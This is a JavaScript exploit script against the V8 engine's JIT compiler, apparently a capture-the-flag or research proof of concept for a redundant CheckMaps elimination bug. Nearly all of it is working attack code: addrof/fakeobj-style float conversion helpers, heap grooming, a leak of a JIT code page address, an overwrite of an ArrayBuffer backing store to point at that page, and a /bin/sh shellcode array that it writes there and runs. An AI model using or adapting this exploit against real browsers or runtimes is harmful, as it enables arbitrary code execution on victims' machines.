var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi){
    return ("0x" + hi.toString(16) + lo.toString(16));
}

// shellcode /bin/sh
var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b]

/* Patched code in redundancy-elimination.cc
 * bugs in CompatibleCheck -> maps

bool IsCompatibleCheck(Node const* a, Node const* b) {
  if (a->op() != b->op()) {
    if (a->opcode() == IrOpcode::kCheckInternalizedString &&
        b->opcode() == IrOpcode::kCheckString) {
      // CheckInternalizedString(node) implies CheckString(node)
    } else if (a->opcode() == IrOpcode::kCheckMaps &&
               b->opcode() == IrOpcode::kCheckMaps) {
      // CheckMaps are compatible if the first checks a subset of the second.
      ZoneHandleSet<Map> const& a_maps = CheckMapsParametersOf(a->op()).maps();
      ZoneHandleSet<Map> const& b_maps = CheckMapsParametersOf(b->op()).maps();
      if (!b_maps.contains(a_maps)) {
        return false;
      }
    } else {
      return false;
    }
  }
  for (int i = a->op()->ValueInputCount(); --i >= 0;) {
    if (a->InputAt(i) != b->InputAt(i)) return false;
  }
  return true;
}

*/

// need to JIT this function to call reducer
function bug(x, cb, i, j) {
	// The check is added here, if it is a packed type as expected it passes
	var a = x[0];
	// our call back, change Array type
	cb();

	// Access data as the wrong type of map
	// Write one offset into the other
	var c = x[i];
	//x[j] = c;
	let tmp = d2u(c);
	x[j] = u2d(tmp[0] - 1 + 0x60, tmp[1]);
	return c;
}

// Unboxed Double Packed Array
// To Leak
var x = [1,1, 2.2, 3.3, 4.4];
//var v = [0x13371337, 0x11331133, {}, 1.1, new Function("eval('')")];
var v = new Array(1000);
var ab = new ArrayBuffer(0x200);

// for debug
//%DebugPrint(x);

function optimization() {
  // call in a loop to trigger optimization
	for (var i = 0; i < 100000; i++) {
        var o = bug(x, function(){}, 1, 1);
	}
}
optimization();

// Trigger bug
// x's Map is changed here,
// but because of invalid optimization technique which redundancy checkmap elimination,
// JIT code stil treat this function as double packed array
// So, we can leak any value :)
// maybe need to set heap grooming

/*
marshimaro-peda$ tel 0x26746c18c620 40
0000| 0x26746c18c620 --> 0x33b536c02661 --> 0x33b536c022
0008| 0x26746c18c628 --> 0x3400000000 ('')
0016| 0x26746c18c630 --> 0x600000000		# 0
0024| 0x26746c18c638 --> 0x30d4000000000	# 1
0032| 0x26746c18c640 --> 0x1000000000		# 2
0040| 0x26746c18c648 --> 0x30d4000000000	# 3
*/

var victim = undefined;
let jit = undefined;
let leaked = bug(x, function(){
	x[100000] = 1;
	// set heap groom
	let ss = new Array(1000);
	let fake_ab = undefined;
	for(let i = 0; i < 1000; i++){
		if( i == 0 ){
			//let jit = function(x){
			jit = function(x){
				return x * x - x + x;
			}
			ss[i] = jit;
			for(let j = 0; j < 10; j++){
				jit(1);
			}
			fake_ab = new ArrayBuffer(1000);
		}
		else{
			ss[i] = 0x13371330 + i;
		}
	}
	//victim = ss;
	victim = fake_ab;
}, 1067, 1072);
// 60 -> JIT Function Object
// 1067 -> JIT Page Addr
// 1072 -> ArrayBuffer BackingStore
let leak = d2u(leaked);
console.log("[-] leak : " + hex(leak[0], leak[1]));

/*
 * Real JIT Code Offset -> + 0x60
marshimaro-peda$ job 0x31d7e39a2f01
0x31d7e39a2f01: [Code]
kind = BUILTIN
name = InterpreterEntryTrampoline
compiler = unknown
Instructions (size = 1170)
0x31d7e39a2f60     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]
*/

let dv = new DataView(victim);
for(let i = 0; i < shellcode.length; i++){
	dv.setUint32(i * 4, shellcode[i], true);
}

jit(1);
